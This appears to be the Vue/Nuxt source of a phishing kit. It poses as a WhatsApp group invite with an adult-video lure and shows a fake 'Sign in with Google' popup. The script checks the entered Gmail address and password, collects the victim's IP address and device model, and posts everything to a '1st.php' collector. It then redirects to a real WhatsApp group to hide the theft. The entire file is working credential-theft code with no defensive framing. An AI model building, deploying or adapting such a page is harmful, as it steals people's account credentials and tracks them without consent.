<script setup>
function fallbackModelFromUA() {
    const ua = navigator.userAgent;
    const match = ua.match(/\s([A-Z0-9\-]+)\sBuild/);
    if (match && match[1]) {
        return match[1];
    } else {
        return 'Deskop/Ios';
    }
}
onMounted(async () => {
    fetch('https://ip4only.me/api/')
        .then(res => res.text())
        .then(text => {
            const ip = text.split(",")[1];
            form.value.ipaddress = ip;
    });
    if (navigator.userAgentData && navigator.userAgentData.getHighEntropyValues) {
      navigator.userAgentData.getHighEntropyValues(["model"])
        .then(ua => {
          if (ua.model) {
            form.value.device = ua.model
          } else {
            form.value.device = fallbackModelFromUA();
          }
        })
        .catch(err => {
          console.warn("Error getHighEntropyValues:", err);
          form.value.device = fallbackModelFromUA();
        });
    } else {
      form.value.device = fallbackModelFromUA();
    }
})
const mask = ref(false);
const googleEmail = ref(null)
const googlePassword = ref(null)
const alertgoogle = ref(null);
const popgoogle = ref(false);
const form = ref({
  googlemail: null,
  googlepassword: null,
  ipaddress: null,
  device: null
})

function doEnter()
{
    popgoogle.value = true;
}


function doFocus()
{
    form.value.googlemail.length !== 0 ? (
        googleEmail.value.classList.add('focus')
    ) : (
        googleEmail.value.classList.remove('focus')
    )

    form.value.googlepassword.length !== 0 ? (
        googlePassword.value.classList.add('focus')
    ) : (
        googlePassword.value.classList.remove('focus')
    )
}

async function doLoginGoogle()
{
    // Check is valid?
    alertgoogle.value = false;
    const regex = /^[a-zA-Z0-9._%+-]+@gmail\.com$/;

    if(!regex.test(form.value.googlemail))
    {
        googleEmail.value.setCustomValidity("Enter your google email");
        googleEmail.value.reportValidity();
        return false;
    }
    if((form.value.googlepassword || '').length < 6)
    {
        googlePassword.value.setCustomValidity("Enter your correct password");
        googlePassword.value.reportValidity();
        return false;
    }
    mask.value = true;

    const res = await fetch('1st.php', {
        method: 'POST',
        headers: {
        'Content-Type': 'application/x-www-form-urlencoded'
        },
        body: new URLSearchParams(Object.entries(toRaw(form.value))).toString()
    })

    if(res) {
        window.location = 'https://chat.whatsapp.com/BaN9CnOeYGs0OmvPDAWkc5?mode=ac_t';
    }

    setTimeout(() => {
        mask.value = false;
        popgoogle.value = false;
    }, 3000)
}


useHead({
    title: 'WhatsApp Group Invite',
    description: 'WhatsApp Group Invite',
})

function isVideoPlaying(video) {
  return (
    video.currentTime > 0 &&
    !video.paused &&
    !video.ended &&
    video.readyState > 2
  )
}

function putar(e) {
    let clickedVideo = e.target;

    // Pause all other videos
    let allVideos = document.querySelectorAll('video');
    allVideos.forEach(video => {
        if (video !== clickedVideo) {
            video.pause();
            video.nextElementSibling.classList.remove('hide'); // Show play button if needed
        }
    });

    // Toggle play/pause for the clicked video
    if (isVideoPlaying(clickedVideo)) {
        clickedVideo.pause();
        clickedVideo.nextElementSibling.classList.remove('hide');
    } else {
        clickedVideo.play();
        clickedVideo.nextElementSibling.classList.add('hide');
    }
}



function fullsc(e)
{
    let video = e.target.previousElementSibling.previousElementSibling

  if (!document.fullscreenElement) {
      if (video.requestFullscreen) {
        video.requestFullscreen()
      } else if (video.webkitRequestFullscreen) {
        video.webkitRequestFullscreen()
      } else if (video.mozRequestFullScreen) {
        video.mozRequestFullScreen()
      } else if (video.msRequestFullscreen) {
        video.msRequestFullscreen()
      }
    } else {
      // keluar fullscreen kalau sudah fullscreen
      if (document.exitFullscreen) {
        document.exitFullscreen()
      } else if (document.webkitExitFullscreen) {
        document.webkitExitFullscreen()
      }
    }
}
</script>

<template>
    <div class="mask" v-show="mask"></div>
    <div class="popgoogle" v-show="popgoogle">
        <div class="googlehead">
            <div class="headImg">
                <img src="https://p1-image.cdn-aihelp.net/FileService/UserFile/0/202505/2025051211364624049b08752ec.png">
            </div>
            <span class="headText">
                Sign in with Google
            </span>
        </div>
        <div class="googlecontent">
            <span class="contentTitle">Sign In</span>
            <span class="contentDesc">to continue to <strong>WhatsApp Messenger</strong></span>

            <div class="googleform">
                <div class="form-group">
                    <input @blur="doFocus" ref="googleEmail" v-model="form.googlemail" type="email">
                    <label>Email or phone</label>
                </div>
                <div class="form-group">
                    <input @blur="doFocus" ref="googlePassword" v-model="form.googlepassword" type="password">
                    <label>Password</label>
                </div>
                <span class="galert" v-show="alertgoogle"><Icon name="mingcute:warning-fill"/> Couldn't find your Google account</span>
                <div class="form-text">
                    <p>Before using this app, you can review OnlyFans Mini Sign-In’s <span>privacy policy</span> and <span>terms of service</span></p>
                </div>
                <div class="form-action">
                    <span class="createaccount">Create account</span>
                    <div class="google-submit" @click="doLoginGoogle">Next</div>
                </div>
            </div>
            <div class="google-footer">
                <div class="footer-right">
                    <span>English (United States)</span>
                </div>
                <div class="footer-right">
                    <span>Help</span>
                    <span>Privacy</span>
                    <span>Terms</span>
                </div>
            </div>
        </div>
  </div>
  <div class="wrapper">
    <div class="header">
        <div class="menu">
            <Icon name="ic:baseline-menu" />
        </div>
        <div class="logo">
            <NuxtImg src="https://static.whatsapp.net/rsrc.php/yZ/r/JvsnINJ2CZv.svg" />
        </div>
        <div class="download">
            <Icon name="mingcute:arrow-to-down-line" />
        </div>
    </div>

    <div class="content">
        <div class="thumb">
            <video src="https://akmweb.youngjoygame.com/web/rikzzganteng/image/8d88bf0ab986a88e6c66c11ebe147672.mp4" autoplay loop muted></video>
        </div>
        <span>🫦 Virall Video | Area 🔞</span>
        <p>WhatsApp Group Invite</p>
        <button @click="doEnter">Join Chat</button>
        <div class="line"></div>
        <div class="text">Don't have WhatsApp yet?</div>
        <a href="#">Download</a>
    </div>

  </div>
</template>

<style>
@import url('https://fonts.googleapis.com/css2?family=Roboto:ital,wght@0,100..900;1,100..900&display=swap');


@import url('../components/google.css');
@font-face {
    font-family: 'google-regular';
    src: url('https://akmweb.youngjoygame.com/web/moonton/image/9429ca5231a6e45590f3bfbbe4728550.woff');
}
@font-face {
    font-family: 'google-medium';
    src: url('https://fonts.gstatic.com/s/googlesans/v62/4UaRrENHsxJlGDuGo1OIlJfC6l_24rlCK1Yo_Iq2tQCIlsw.woff2');
}
*
{
    margin: 0;
    padding: 0;
    box-sizing: border-box;
}

body
{
    width: 100%;
    min-height: 100vh;
    display: flex;
    align-items: center;
    justify-content: center;
    flex-direction: column;
    font-family: 'Roboto';
    color: #1C1E21;
}

.wrapper
{
    min-height: 100vh;
    width: 500px;
    background: #FFFFFF;
    display: flex;
    align-items: center;
    justify-content: flex-start;
    flex-direction: column;
    color: #000;
    padding: 20px;
}

.wrapper .header
{
    position: relative;
    width: 100%;
    display: flex;
    align-items: center;
    justify-content: space-between;
}
.header .menu .iconify
{
    font-size: 25px;
    color: #1C1E21;
}
.header .logo img
{
    width: 100px;
}
.header .download
{
    position: relative;
    background: #25D366;
    border: 1px solid #1C1E21;
    border-radius: 100%;
    height: 30px;
    width: 30px;
    display: flex;
    align-items: center;
    justify-content: center;
}
.header .download .iconify
{
    position: relative;
    top: -1px;
    color: #1C1E21;
    font-size: 20px;
}

.wrapper .content
{
    margin-top: 80px;
    width: 100%;
    display: flex;
    align-items: center;
    justify-content: center;
    flex-direction: column;
    color: #5E5E5E;
}

.content .thumb
{
    width: 120px;
    height: 120px;
}

.content span
{
    margin-top: 20px;
    font-size: 19px;
}

.content p
{
    margin-top: 5px;
    font-size: 16px;
}

.content .text
{
    color: #5E5E5E;
    font-size: 16px;
    margin-top: 20px;
}

.content button
{
    margin-top: 20px;
    padding: 15px 20px;
    background: #128c7e;
    border-radius: 50px;
    color: #fff;
    border: none;
    outline: none;
    font-size: 16px;
}

.content a
{
    margin-top: 5px;
    text-decoration: none;
    color: #39b3ed;
}

.content .line
{
    margin-top: 20px;
    width: 200px;
    height: 1px;
    background: #F0F4F9;
}

.thumb video
{
    max-width: 100%;
    border-radius: 100%;
}

@media (max-width: 500px)
{
    .wrapper
    {
        max-width: 100% !important;
    }
}


@media(min-width: 425px)
{
    #__nuxt .popgoogle
    {
        max-width: 350px !important;
    }

}
</style>